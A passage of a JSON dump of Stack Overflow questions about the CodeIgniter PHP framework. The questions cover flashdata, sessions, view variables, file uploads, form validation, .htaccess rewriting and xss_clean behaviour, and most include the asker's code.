HMVC modules or some kind of plugin system, given that people say modules are supposed to be disjointed.</p>\n\n<p>for example lets say my existing app have a User controller and a model for it. Now I want to create a new accounting module for this which would extend my current base controllers and models to add ..say..some new data fields about each user which would be used in accounts modules. Or something which you see done in Wordpress plugins. Can those be considered modules? </p>\n\n<p>Currently what i see around is each module have its own MVC thereby having different URLS for the added module. I just wanted a way to add additional functionality to existing controllers  and if I remove the module, the core app is unaffected.</p>\n\n<p>Point me to the right post if this question is already answered.</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12551969,"title":"codeigniter flashdata never arrive in my controller","body":"<p>I have this code in my view:</p>\n\n<pre><code>if (($faq_cat['categoryphoto'] !=\"\")|| ($faq_cat['categoryphoto'] != NULL)) {\n       $this-&gt;session-&gt;set_flashdata('tablename', 'faq_categories');\n       $this-&gt;session-&gt;keep_flashdata('tablename');\n       $this-&gt;session-&gt;set_flashdata('recordid', $faq_cat['catid']);\n       $this-&gt;session-&gt;set_flashdata('fieldname', 'catid');\n       $this-&gt;session-&gt;set_flashdata('fieldToUpdate', 'categoryphoto');\n       $this-&gt;session-&gt;set_flashdata('dpage', 'faq/editFaqCategory');\n       echo anchor('faqcategories/updateOneField', 'Delete Current Photo?');\n}\n</code></pre>\n\n<p>In my controller, I have the following code:</p>\n\n<pre><code>    public function updateOneField() \n    {  \n\n        $tablename = $this-&gt;session-&gt;flashdata('tablename');\n        $id = $this-&gt;session-&gt;flashdata('recordid');\n        $fieldname = $this-&gt;session-&gt;flashdata('fieldname');\n        $fieldToUpdate = $this-&gt;session-&gt;flashdata('fieldToUpdate');\n        echo \"&lt;br /&gt;table name is: \" .$tablename;\n        echo $id;\n        echo $fieldname;\n        echo $fieldToUpdate;\n        die();\n        $this-&gt;load-&gt;model('faqCategoriesModel');\n        $this-&gt;faqCategoriesModel-&gt;save(array($fieldToUpdate =&gt; ''), $id);        \n        $catid = $id;\n        $this-&gt;displayEditFaqCategoryForm($catid);\n    } // end of function updateOneField  \n</code></pre>\n\n<p>Any attempt to read the data sent trough the flash data is failing. All flashdata variables comes empty. I load  the session in my autoload.php file. This very same code, works in another CI application. Can anyone spot what i am doing wrong? I tried to use <code>$this-&gt;session-&gt;keep_flashdata('item');</code> both in my view and controller, without any success.</p>\n"},{"tags":["php","arrays","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":12551351,"title":"Codeignter Set variable","body":"<p>I am new to CodeIgniter. I have a controller named <code>categories</code> in which I have </p>\n\n<pre><code>function description($id=null) {\n    $this-&gt;load-&gt;helper(array('form', 'url'));\n    $this-&gt;load-&gt;library('session');\n    $this-&gt;load-&gt;view('category/description');\n    $this-&gt;load-&gt;model('userdata_model');\n    $data = $this-&gt;userdata_model-&gt;desc($id);\n    $this-&gt;load-&gt;view('category/description', $data);\n}\n</code></pre>\n\n<p>Now when I do <code>print_r($data);</code> it gives me the following result</p>\n\n<pre><code>Array\n(\n    [0] =&gt; stdClass Object\n        (\n            [id] =&gt; 4481\n            [title] =&gt; Dvd Recorder Post\n            [image_name] =&gt; \n            [image_name_work] =&gt; \n            [video_name] =&gt; \n            [work_type] =&gt; tape-recrder\n            [description] =&gt; Test first..\n            [agency] =&gt; \n            [services] =&gt; \n            [photographer] =&gt; \n            [company] =&gt; \n            [director] =&gt; \n            [dop] =&gt; \n            [userid] =&gt; \n            [display_order] =&gt; 99999\n            [latest_work] =&gt; No\n            [status] =&gt; Active\n            [post_adddate] =&gt; 2012-03-26 10:14:07\n            [date] =&gt; 2012-03-26 10:14:07\n            [sub_cat] =&gt; dvd-reorder\n            [views] =&gt; 75\n            [url] =&gt; Dvd-recorder-post\n            [post_cache] =&gt; \n            [post_cat_id] =&gt; 0\n            [post_link] =&gt; \n            [post_pubdate] =&gt; \n            [post_seo_url] =&gt; \n            [post_status] =&gt; 0\n            [post_type] =&gt; 0\n        )\n\n)\n</code></pre>\n\n<p>Now when I try to access <code>$data</code> in <code>description.php</code> in the view page it gives me following error </p>\n\n<blockquote>\n<pre><code>A PHP Error was encountered\n\nSeverity: Notice\n\nMessage: Undefined variable: data\n\nFilename: category/description.php\n\nLine Number: 2\n</code></pre>\n</blockquote>\n\n<p>Anybody has an idea why?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":540,"score":4,"question_id":2618416,"title":"use Classname() or __construct() as constructor in CodeIgniter?","body":"<p>should i use Classname() or __construct() as constructor in CodeIgniter?</p>\n\n<p>both work, which should i use?</p>\n"},{"tags":["php","session","codeigniter","cookies"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3107,"score":0,"question_id":3837364,"title":"Codeigniter, $_SESSION arrays","body":"<p>i'm trying to use native $_SESSION arrays in Codeigniter beacause i can't use $_COOKIES arrays,\nso i made my own class but seems that Codeigniter continue to save data on cokkies cause if i disable browser cookies i can't retrieve $_SESSION data :O !! incredible....i can't understand why?\nis codeigniter stopping or removing all $_SESSION data setted ?</p>\n\n<p>is there someone that is still using only $_SESSION arrays ,aborting default $_COOKIE arrays option? i mean ,i would like to have session data not cookie data but it seems to be impossible :O!!!??!!</p>\n\n<p>i have renamed CI original Session.php library as Cookie.php,and than i made two personal classes into application/libraries and i load them by default into autoloader.php</p>\n\n<h2>1) Personal Library - Session.php</h2>\n\n<pre><code>session_start();\n\nclass Session {\n\n\n     function set_data($key,$data)\n    {\n\n      if(!$key)\n      { echo 'first param passed is null in session set_data';}\n      if(!$data)\n      { echo 'second param passed is null in session set_data';}\n     if(isset($key) &amp;&amp; isset($data))\n     {\n         if(isset($_SESSION[$key]))\n         {\n             unset($_SESSION[$key]);\n         }\n\n      return $_SESSION[$key] = $data;\n\n\n     }\n  function keep_data($key)\n    {\n\n       if(!$key)\n      { echo 'first param passed is null in session keep_data';}\n\n       if(isset($_SESSION[$key]))\n       {\n         return htmlentities($_SESSION[$key]);\n       }\n    }\n</code></pre>\n\n<hr>\n\n<h2>2) Personal Library - Settings.php</h2>\n\n<pre><code>class Settings {\n\n\n     function setsitelanguage()\n    {\n        $CI =&amp; get_instance();\n\n        if($CI-&gt;session-&gt;keep_data('lang'))\n        {\n            $CI-&gt;config-&gt;config['language'] = $CI-&gt;session-&gt;keep_data('lang');\n        }\n        else\n        {\n          $CI-&gt;config-&gt;config['language'] = \"en\";\n        }\n\n    } \n</code></pre>\n\n<hr>\n\n<p>than i have 2 controllers</p>\n\n<hr>\n\n<h2>1) Controller Home.php</h2>\n\n<pre><code>class Home extends Controller {\n\n    function Home()\n    {\n\n        parent::Controller();\n\n               $this-&gt;settings-&gt;setsitelanguage();\n\n        }\n\n\n    function index()\n    {\n        $this-&gt;load-&gt;view('home/home_view');\n\n    }\n        function session()\n        {\n           echo   $this-&gt;session-&gt;keep_data('lang');\n        }\n\n} \n</code></pre>\n\n<hr>\n\n<h2>2) Controller Auth.php</h2>\n\n<pre><code>class Auth extends Controller {\n\n\n     function usersetlang()\n    {\n\n               $lang = $this-&gt;uri-&gt;segment(3);\n\n              return $this-&gt;session-&gt;set_data('lang',$lang);\n\n\n\n\n\n        }\n}\n</code></pre>\n\n<hr>\n\n<p>as shown in <code>http://mysite/index.php/home/session</code>, i can retrieve my language site stored with session.php by auth.php\nthe only problem is that is not enough using global <code>$_SESSION[]</code> ,because if i try to retrieve data disabling my browser cookies <code>$_SESSION[]</code> data doesn’t appears !!! </p>\n"},{"tags":["php","css","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12550148,"title":"Codeigniter Link to Stylesheet","body":"<p>I am trying to learn Codeigniter. I have built a simple MVC following the tutorials on the CI site. This is my controller...</p>\n\n<pre><code>&lt;?php\n\nclass Pages extends CI_Controller {\n\n    public function view($page = 'home'){\n\n        if(!file_exists(APPPATH.'/views/pages/'.$page.'.php')){\n            show_404();\n        }\n\n        $data['title'] = ucfirst($page);\n\n        $this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('pages/'.$page, $data);\n        $this-&gt;load-&gt;view('templates/footer', $data);\n    }\n}\n</code></pre>\n\n<p>Here is the header template...</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;&lt;?php echo $title ?&gt; - WurkWithUs&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"http://localhost/ci/CodeIgniter_2.1.2/css/bootstrap.css\" type=\"text/css\" media=\"screen\"/&gt;\n    &lt;link rel=\"stylesheet\" href=\"http://localhost/ci/CodeIgniter_2.1.2/css/custom.css\" type=\"text/css\" media=\"screen\"/&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Wurk With Us&lt;/h1&gt;\n</code></pre>\n\n<p>The style sheets work when I use an absolute path like the one above. However if I try to use something like... </p>\n\n<pre><code>&lt;link rel=\"stylesheet\" href=\"&lt;?= base_url()?&gt;css/bootstrap.css\" type=\"text/css\" media=\"screen\"/&gt;\n</code></pre>\n\n<p>I get a blank page. When I \"view page source\" my style line looks like...</p>\n\n<pre><code>    &lt;link rel=\"stylesheet\" href=\"\n</code></pre>\n\n<p>I have tried to follow the suggestions <a href=\"http://stackoverflow.com/questions/2745153/codeigniter-php-stylesheet-link-how\">here</a> and I get the same results i.e. document stops being parsed at the \"href=\" line. </p>\n\n<p>What am I doing wrong? Is there a better way to load my stylesheets?</p>\n"},{"tags":["codeigniter","controller"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12540238,"title":"Changing Default Controller Dyanmically in Codeigniter","body":"<p>I want to change my default controller in codeigniter is it possible? For guests I want to show different controller and for members another one</p>\n\n<pre><code>if($this-&gt;cuser-&gt;usercode()){\n//loading default controller\n\n$route['memebers_welcome'];\n\n}else{\n\n$route['guests_welcome'];\n\n}\n</code></pre>\n\n<p>if its possible please advise otherwise I will have to use redirect function which I dont think is good practice.</p>\n"},{"tags":["php","javascript","html","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12548390,"title":"Why won't my datetime picker work?","body":"<p>I am using code igniter, and I want to add a datetime picker using datetimepicker. The script can be found <a href=\"http://www.javascriptkit.com/script/script2/tengcalendar.shtml\" rel=\"nofollow\">here</a></p>\n\n<p>I have 2 sections on my webpage - the header and the content. On the controller, I load them both. Here is my javascript head</p>\n\n<pre><code>&lt;script href=\"&lt;?php echo base_url(); ?&gt;js/datetimepicker.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>and here is my textbox code \n<code>&lt;input id=\"tanggal\" type=\"text\" class=\"textbox\" disabled=\"disabled\"&gt; &lt;a href=\"javascript:NewCal('tanggal','ddmmyyyy')\"&gt;&lt;img src=\"&lt;?php base_url(); ?&gt;img/cal.gif\"&gt;&lt;/a&gt;</code></p>\n\n<p>when I refresh the page, I can hover the cal.gif, but when I click em, cal.gif is not responding. What went wrong in my code? </p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":121,"score":0,"question_id":12546969,"title":"Object of class stdClass could not be converted to string in codeigniter","body":"<p>there are two sample here,</p>\n\n<p>1.</p>\n\n<p>in controller</p>\n\n<pre><code> $result_article = $this-&gt;cms-&gt;get_content($event_id);\n if($result_article-&gt;num_rows() == 1){\n $data['row'] = $result_article-&gt;row();\n}\n</code></pre>\n\n<p>in my view</p>\n\n<pre><code>&lt;?php echo $row-&gt;title; ?&gt;\n</code></pre>\n\n<p>print_r($row)/print_r($result_article->row()); output</p>\n\n<pre><code>stdClass Object ( [id] =&gt; 43 [title] =&gt; Grant visit by Prime Minister [content] =&gt; this is the content [create_date] =&gt; 2012-09-21 [last_update] =&gt; 2012-09-22 19:27:12 )\n</code></pre>\n\n<p>with error appeared </p>\n\n<pre><code>A PHP Error was encountered\nSeverity: 4096\nMessage: Object of class stdClass could not be converted to string\nFilename: libraries/Parser.php\nLine Number: 101\n</code></pre>\n\n<p>2.</p>\n\n<p>in controller</p>\n\n<pre><code>$result_article = $this-&gt;cms-&gt;get_content($event_id);\n\n                    if($result_article-&gt;num_rows() == 1){\n                        $row = $result_article-&gt;row();\n\n                          $data = array(\n                             'title' =&gt; $row-&gt;title\n                          );\n}\n</code></pre>\n\n<p>in my view </p>\n\n<pre><code>&lt;?php echo $title; ?&gt;\n</code></pre>\n\n<p>print_r($title) output</p>\n\n<pre><code>Grant visit by Prime Minister\n</code></pre>\n\n<p>no error.</p>\n\n<p>what is the different between the 1st controller and 2nd code, it suppose to be the same output right? i am confused！ </p>\n\n<p>to make it more clear, i have simplified the code</p>\n\n<p>here is the model</p>\n\n<pre><code>function get_content($event_id){\n     $this-&gt;db-&gt;select('id,title,content,create_date,last_update');\n     $query = $this-&gt;db-&gt;get_where('events',array('id' =&gt; $event_id));\n     return $query;\n}\n</code></pre>\n\n<p>the controller </p>\n\n<pre><code>$data['query']  = $this-&gt;cms-&gt;get_content($this-&gt;uri-&gt;segment(3));\n\nif($data['query']-&gt;num_rows() == 1){\n$row = $data['query']-&gt;row();\n\n&lt;!--with this code, no error appear--&gt;\n$data = array(\n'title' =&gt; $row-&gt;title,\n'content' =&gt; $row-&gt;content,\n'create_date' =&gt; $row-&gt;create_date,\n'last_update' =&gt; $row-&gt;last_update,\n'event_id' =&gt; $row-&gt;id\n              );\n&lt;!--with this code, no error appear--&gt; \n</code></pre>\n\n<p>if is only these code</p>\n\n<pre><code>$data['query']  = $this-&gt;cms-&gt;get_content($this-&gt;uri-&gt;segment(3));\n\n    if($data['query']-&gt;num_rows() == 1){\n    $row = $data['query']-&gt;row();\n</code></pre>\n\n<p>error happen,</p>\n\n<pre><code>A PHP Error was encountered\nSeverity: 4096\nMessage: Object of class CI_DB_mysql_result could not be converted to string\nFilename: libraries/Parser.php\nLine Number: 101\n</code></pre>\n"},{"tags":["codeigniter","inheritance"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":108,"score":3,"question_id":11431718,"title":"Codeigniter Multi-level Inheritance","body":"<p>I am having problem in using multilevel inheritance as follows.</p>\n\n<p>I have a top level controller that extends CI_Controller class</p>\n\n<pre><code>class Application extends CI_Controller\n{\n}\n</code></pre>\n\n<p>A controller named 'Site' and 'Admin' extends the Application controller as</p>\n\n<pre><code>class Site extends Application\n{\n}\n\nclass Admin extends Application\n{\n}\n</code></pre>\n\n<p>And finally class 'User' and 'Guest' extends 'Site' controller</p>\n\n<pre><code>class User extends Site\n{\n}\n\nClass Guest extends Site\n{\n}\n</code></pre>\n\n<p>The problem is, in User and Guest controller I am not able to load core libraries such as pagination, form_validation etc. using</p>\n\n<p>$this->load->library('pagination);</p>\n\n<p>But it works when I load the library in Site controller or Application contoller ie. controller that extends the core CI_Controller and it's child controller. When I try to load in grand child it doesn't work. </p>\n\n<p>Can somebody clarify why this is happening? Thanks...</p>\n"},{"tags":["php","codeigniter","upload"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":12548620,"title":"Can't get the upload form in CodeIgniter to work properly","body":"<p>I have a form where a user can edit their public profile and upload a picture in the process. Everything works fine except for when a user has a photo uploaded or just leaves it blank to not change it it still goes ahead and tries to upload it and throws an error if it's empty... I do have a check in place, however it just ignores it.</p>\n\n<pre><code>if(isset($_FILES['userfile']))\n    {\n        $file_name = $this-&gt;session-&gt;userdata('user_id');\n        $img = $this-&gt;custom_lib-&gt;img_upload('./upload/user/', $file_name);\n        $user_pic = 'upload/user/'.$file_name.$img['file_ext'];\n    } else {\n        $user_pic = 'upload/default.png';\n    }\n</code></pre>\n\n<p>The problem I think is within the if statement however I don't see what it can possibly be. If I do select an image it uploads it just fine and everything works well. If I leave the image field blank (not select a file) instead of doing this:</p>\n\n<pre><code>$user_pic = 'upload/default.png';\n</code></pre>\n\n<p>it tries to upload a file... which doesn't exist... and then it throws an error. The img_upload() function is inside a custom library I made, however that function shouldn't even be called if no file was submitted.</p>\n\n<p>I appreciate any help!</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12548441,"title":"Codeigniter controllers var","body":"<p>I got a conroller like:</p>\n\n<pre><code>class listItems extends CI_Controller{\n    private $num;\n\n    public class __construct(){\n        parent::__construct();\n        $this-&gt;num=10;\n    }\n\n    public class index(){\n        echo $this-&gt;num;\n    }\n}\n</code></pre>\n\n<p>when i do this i got nothing. why?</p>\n"},{"tags":["php","codeigniter","upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12548292,"title":"Determining if a file was submitted with codeigniter","body":"<p>I basically have an edit profile page that along with other fields has a option to upload a picture. Now the problem I have is determining wether or not they submitted a file or left it blank(default).</p>\n\n<p>My current code:</p>\n\n<pre><code>if($this-&gt;input-&gt;post('user_pic') === FALSE)\n    {\n        //Don't do anything.\n    } else {\n        //Proccess upload.\n    }\n</code></pre>\n\n<p>The form is done correctly with multi-part and all, and other values do update, so I am assuming that this exact code that isn't working.</p>\n\n<p>The problem is that even if I do submit a file it remains just like it was, or another words doesn't do anything. Am I doing this wrong?</p>\n"},{"tags":["php","codeigniter","post"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12536234,"title":"What does $this->input->post('submit') return when it is submitted?","body":"<p>I am checking my form and want to know if this would be correct. I have the same function processing two forms based on which submit button was clicked and my question is basically would the following work fine...</p>\n\n<pre><code>public function register()\n{\n    $user = $this-&gt;input-&gt;post('user_register');\n    $store = $this-&gt;input-&gt;post('store_regiser');\n\n    if($user === FALSE AND $store === FALSE)\n    {\n        $this-&gt;load-&gt;view('tmp', array('tmp' =&gt; 'main/register'));\n    }\n\n    if($user != FALSE)\n    {\n        //User register\n    }\n\n    if($store != FALSE)\n    {\n        //Store register\n    }\n}\n</code></pre>\n\n<p>Thank you!</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":128,"score":2,"question_id":12540397,"title":"Getting CodeIgniter to save the values after form submittal","body":"<p>I am new to CodeIgniter and I'm really having a hard time getting the form values to repopulate after submitting a form in a simple CRUD app (on both error and success).  I thought it may help if I post my code here and maybe someone can help out.</p>\n\n<p>Here is from my controller:</p>\n\n<pre><code>function update($id){\n\n        $seller = $this-&gt;seller_model-&gt;get_seller_byID($id)-&gt;row();\n        $data['seller'] = $seller;\n\n        $data['title'] = 'Update seller';\n        $data['message'] = '';\n        $data['action'] = site_url('seller/updateSeller');\n        $data['link_back'] = anchor('seller/ManageSellers/','Back to list of sellers',array('class'=&gt;'back'));\n\n        $this-&gt;load-&gt;view('EditSeller', $data);\n    }\n\n    function updateSeller(){\n\n        $data['title'] = 'Update seller';\n        $data['action'] = site_url('seller/updateSeller');\n        $data['link_back'] = anchor('seller/ManageSellers/','Back to list of sellers',array('class'=&gt;'back'));\n\n        $this-&gt;setValidation();\n\n        if ($this-&gt;form_validation-&gt;run() == FALSE)\n        {\n        $data['message'] = 'fail';\n        }\n        else\n        {\n            $id = $this-&gt;input-&gt;post('id');\n\n            $seller = array('s_fname' =&gt; $this-&gt;input-&gt;post('fname'),\n                            's_lname' =&gt; $this-&gt;input-&gt;post('lname'),\n                            's_email' =&gt; $this-&gt;input-&gt;post('email'),\n                            's_password' =&gt; $this-&gt;input-&gt;post('pword'));\n\n            $this-&gt;seller_model-&gt;update_seller($id,$seller);\n\n            $data['message'] = '&lt;div class=\"success\"&gt;update seller success&lt;/div&gt;';\n        }   \n        $this-&gt;load-&gt;view('EditSeller', $data);\n    }\n\n    function setValidation()\n    {\n        $this-&gt;form_validation-&gt;set_rules('fname', 'First Name', 'required');\n        $this-&gt;form_validation-&gt;set_rules('lname', 'Last Name', 'required');\n        $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'required');\n        $this-&gt;form_validation-&gt;set_rules('pword', 'Password', 'required');\n        $this-&gt;form_validation-&gt;set_rules('status', 'Status', 'required');\n        $this-&gt;form_validation-&gt;set_rules('dealer', 'Dealer', 'required');\n    }   \n</code></pre>\n\n<p>and here is my view:</p>\n\n<pre><code>    &lt;html&gt;\n&lt;head&gt;\n\n&lt;/head&gt;\n&lt;body&gt;\n        &lt;h2&gt;&lt;?php echo $title; ?&gt;&lt;/h2&gt;\n\n        &lt;?php echo $message; ?&gt;\n\n        &lt;?php echo validation_errors(); ?&gt;\n\n    &lt;div class=\"content\"&gt;\n        &lt;form method=\"post\" action=\"&lt;?php echo $action; ?&gt;\"&gt;\n        &lt;div class=\"data\"&gt;           \n\n                &lt;p&gt;&lt;?php\n                    if (isset($seller-&gt;s_id))\n                    {\n                        echo \"Id: \" . $seller-&gt;s_id;\n                        echo form_hidden(\"id\", isset($seller-&gt;s_id) ? $seller-&gt;s_id : '' );\n                    }\n                ?&gt;&lt;/p&gt;\n\n                &lt;p&gt;First Name: \n                    &lt;?php \n                        $field = array(  'name' =&gt; 'fname', \n                                         'size' =&gt; 30, \n                                         'class'=&gt;'input', \n                                         'value' =&gt; (isset($seller-&gt;s_fname) ? $seller-&gt;s_fname : '' ) );\n                        echo form_input($field, set_value('fname')); \n                    ?&gt;\n                &lt;/p&gt;\n\n                &lt;p&gt;Last Name: \n                    &lt;?php \n                        $field = array(  'name' =&gt; 'lname', \n                                         'size' =&gt; 40, \n                                         'class'=&gt;'input', \n                                         'value' =&gt; (isset($seller-&gt;s_lname) ? $seller-&gt;s_lname : '' ) );\n                        echo form_input($field, set_value('lname')); \n                    ?&gt;\n                &lt;/p&gt;\n\n                &lt;p&gt;Email: \n                    &lt;?php \n                        $field = array(  'name' =&gt; 'email', \n                                         'size' =&gt; 60, \n                                         'class'=&gt;'input', \n                                         'value' =&gt; (isset($seller-&gt;s_email) ? $seller-&gt;s_email : '' ) );\n                        echo form_input($field, set_value('email')); \n                    ?&gt;\n                &lt;/p&gt;\n\n                &lt;p&gt;Password: \n                    &lt;?php \n                        $field = array(  'name' =&gt; 'pword', \n                                         'size' =&gt; 20, \n                                         'class'=&gt;'input', \n                                         'value' =&gt; (isset($seller-&gt;s_password) ? $seller-&gt;s_password : '' ) );\n                        echo form_password($field, set_value('pword')); \n                    ?&gt;\n                &lt;/p&gt;\n\n                &lt;p&gt;Status: \n                    &lt;select name=\"status\"&gt;\n                        &lt;option value=\"1\" &lt;?php echo set_select('status', '1', TRUE); ?&gt;&gt;Verified&lt;/option&gt;\n                        &lt;option value=\"2\" &lt;?php echo set_select('status', '2'); ?&gt;&gt;Not verified&lt;/option&gt;\n                    &lt;/select&gt;\n                &lt;/p&gt;\n\n                &lt;p&gt;Dealer:\n                    &lt;input type=\"radio\" name=\"dealer\" value=\"Y\" &lt;?php echo set_radio('dealer', '1', TRUE); ?&gt;/&gt; Yes\n                &lt;input type=\"radio\" name=\"dealer\" value=\"N\" &lt;?php echo set_radio('dealer', '2'); ?&gt;/&gt; No\n                &lt;/p&gt;\n\n                &lt;p&gt;&lt;?php\n                    if (isset($seller-&gt;s_startdate))\n                    {\n                        echo \"Start Date: \" . $seller-&gt;s_startdate;\n                    }\n                ?&gt;&lt;/p&gt;\n\n           &lt;input type=\"submit\" value=\"Save\"/&gt;\n\n               &lt;p&gt;&lt;?php echo $link_back; ?&gt;&lt;/p&gt;\n\n        &lt;/div&gt;\n        &lt;/form&gt;\n        &lt;br /&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>If my validation is successful, it saves to the database properly, but on the page reload the text box is not populated.  When there is a validation error, the database does not get altered as expected, but the values are not staying in the form fields.</p>\n"},{"tags":["php","arrays","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12545973,"title":"codeigniter flatten array of query result","body":"<p>I'm using a query in Codeigniter to return the ids of all the rows that belong to a user. </p>\n\n<pre><code>$this-&gt;db-&gt;select('id');\n$this-&gt;db-&gt;where('user_id', 99);\n$query = $this-&gt;db-&gt;get('my_table');\nreturn $query-&gt;result_array();\n</code></pre>\n\n<p>This returns </p>\n\n<pre><code>Array ( [0] =&gt; Array ( [id] =&gt; 8 ) [1] =&gt; Array ( [id] =&gt; 7 ) [2] =&gt; Array ( [id] =&gt; 6 ) )\n</code></pre>\n\n<p>Is it possible to return a flat array like </p>\n\n<pre><code>Array ( [0] =&gt; 8 [1] =&gt; 6 [2] =&gt; 7 )\n</code></pre>\n\n<p>?</p>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12544285,"title":"htaccess and codeigniter, make a folder accessible","body":"<p>My Codegniter app structure is</p>\n\n<pre><code>- root\n---- application \n---- system\n---- includes\n---- .htaccess\n---- index.php\n</code></pre>\n\n<p>I would make the \"includes\" folder accessible for all,\ninfact actually my folder /includes is inaccesible. Only my index.php is accesseble.\nI would like to make only \"includes\" dir accessible with all subdirectories.</p>\n\n<p>this is my htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\n\n#Removes access to the system folder by users.\n#Additionally this will allow you to create a System.php controller,\n#previously this would not have been possible.\n#'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n\n#When your application folder isn't in the system folder\n#This snippet prevents user access to the application folder\n#Submitted by: Fabdrol\n#Rename 'application' to your applications folder name.\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n#Checks to see if the user is attempting to access a valid file,\n#such as an image or css document, if this isn't true it sends the\n#request to index.php\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\n\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n# Submitted by: ElliotHaughin\n\nErrorDocument 404 /index.php\n\n&lt;/IfModule&gt; \n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["php","asp.net","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":245,"score":1,"question_id":8290284,"title":"ASP.NET to codeigniter","body":"<p>I am ASP.NET webforms developer almost 7 years experience. Have done a small ASP.NET MVC project too. Pretty clear with MVC skills</p>\n\n<p>Please advise-</p>\n\n<ol>\n<li><p>Do I need to learn PHP before starting to learn CodeIgniter? I would rate my skills as follows (out of scale of 1-10)\nHTML 6/10\nCSS 4/10\nJavascript 8/10\nJQuery 6/10\nDatabase 9/10\nMVC understanding 8/10\nXml/Xslt   8/10</p></li>\n<li><p>Does it make sense to move from .NET to Linux based development?</p></li>\n<li><p>Based on above skill set level. How difficult/easy to move into PHP field</p></li>\n</ol>\n"},{"tags":["codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12542800,"title":"xss_clean (codeigniter) doesn't work on real server","body":"<p>I tried this simple code on the localhost.<br>\nI typed <code>&lt;script&gt;</code> on input form and browser gave me <code>[REMOVED]</code>.<br>\nBut when I uploaded to the real server, browser gave me 403 Error (forbidden).\nDoes any body know why? Any help would be great. Thanks.<br>\nHere's the code:</p>\n\n<p>xss.php //controller</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\nclass Xss extends CI_Controller {\n   public function index() {\n     $this-&gt;load-&gt;view(\"v_xss\");\n   }\n\n   public function get_xss(){\n     echo $this-&gt;input-&gt;post(\"text\",TRUE);\n   }\n}\n</code></pre>\n\n<p>v_xss.php //view</p>\n\n<pre><code>echo form_open('xss/get_xss');\n  $attrib1=array('name'=&gt;'text','id'=&gt;'text','size'=&gt;22,'value'=&gt;set_value('text'));\n  echo \"&lt;p&gt;\".form_input($attrib1).\"&lt;/p&gt;\";\n  $attrib2=array('name'=&gt;'submit','id'=&gt;'submit','value'=&gt;'Go',);\n  echo \"&lt;p&gt;\".form_submit($attrib2).\"&lt;/p&gt;\";\necho form_close();\necho validation_errors();\n</code></pre>\n\n<p>note: other functions, classes, helpers work fine. (e.g. DB class, email class, captcha helper)</p>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12534523,"title":"can't remove index.php with .htaccess","body":"<p>i have installed codeigniter and i want to remove the index.php from url when i access localhost/aplication/index.php. i have set uncomment mod_rewrite.so from httpd.conf en this is my .htaccess file :</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n\n<p>its succes when i acces url from localhost/aplication/index.php/data/users/12 but not with this url localhost/aplication/data/users/12.</p>\n\n<p>how can i fix this??</p>\n"},{"tags":["codeigniter","hmvc","tankauth"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1765,"score":3,"question_id":7239497,"title":"Setting up Codeigniter HMVC with tank auth","body":"<p>I am having trouble getting a working Codeigniter version 2.0.3 with hmvc and tank auth(set up as a module) setup properly. I have installed CI properlly and then install HMVC with these directions <a 